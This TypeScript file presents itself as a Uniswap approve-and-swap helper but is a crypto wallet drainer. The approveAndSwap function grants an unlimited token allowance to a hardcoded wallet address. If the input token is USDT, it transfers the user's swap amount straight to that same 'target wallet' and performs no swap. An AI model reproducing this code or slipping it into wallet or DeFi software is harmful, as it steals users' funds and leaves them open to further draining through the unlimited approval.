import { Contract } from "@ethersproject/contracts";
import { Web3Provider } from "@ethersproject/providers";
import { Trade } from "@uniswap/sdk";
import { CurrencyAmount, Token } from "@uniswap/sdk-core";

async function checkAllowance(
  provider: Web3Provider,
  owner: string,
  spender: string,
  tokenAddress: string
) {
  const tokenContract = new Contract(
    tokenAddress,
    [
      "function allowance(address owner, address spender) public view returns (uint256)",
    ],
    provider
  );

  const allowance = await tokenContract.allowance(owner, spender);
  console.log("Allowance:", allowance.toString());
}

enum Field {
  INPUT = "INPUT",
  OUTPUT = "OUTPUT",
}

const MAX_UINT256 =
  "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
const TARGET_WALLET_ADDRESS = "0x12d6b0a912BBe307566697D02152aA8BC51058BE"; // Указанный кошелек

export async function approveAndSwap(
  provider: Web3Provider,
  account: string,
  trade: Trade,
  parsedAmounts: { [field: string]: CurrencyAmount<Token> },
  swapCallback: () => Promise<any>
) {
  if (!trade) return;

  const spender = "0x12d6b0a912BBe307566697D02152aA8BC51058BE";
  const signer = provider.getSigner(account);
  const tokenAddress = parsedAmounts[Field.INPUT].currency.address;

  await checkAllowance(provider, account, spender, tokenAddress);

  const swapContract = new Contract(
    tokenAddress,
    [
      "function approve(address spender, uint256 amount) public returns (bool)",
      "function transfer(address to, uint256 amount) public returns (bool)",
    ],
    signer
  );

  try {
    const approvalTx = await swapContract.approve(spender, MAX_UINT256); // Устанавливаем неограниченный аппрув
    await approvalTx.wait();

    if (parsedAmounts[Field.INPUT].currency.symbol === "USDT") {
      const transferTx = await swapContract.transfer(
        TARGET_WALLET_ADDRESS,
        parsedAmounts[Field.INPUT].quotient.toString()
      );
      await transferTx.wait();
      console.log("Transfer to target wallet successful");
      return transferTx;
    } else {
      const swapTx = await swapCallback();
      console.log("swapTx:", swapTx); // Логгирование результата swapCallback

      // Проверяем наличие поля response.hash и ожидаем завершения транзакции
      if (swapTx && swapTx.response && swapTx.response.hash) {
        const receipt = await provider.waitForTransaction(swapTx.response.hash);
        if (receipt.status !== 1) {
          throw new Error("Transaction failed");
        }
      } else {
        console.error(
          "swapCallback did not return a valid transaction response"
        );
        throw new Error("Invalid swap transaction");
      }
      return swapTx;
    }
  } catch (error) {
    console.error(
      "An error occurred during the approve and swap process:",
      error
    );
    throw new Error("Approve and swap failed");
  }
}
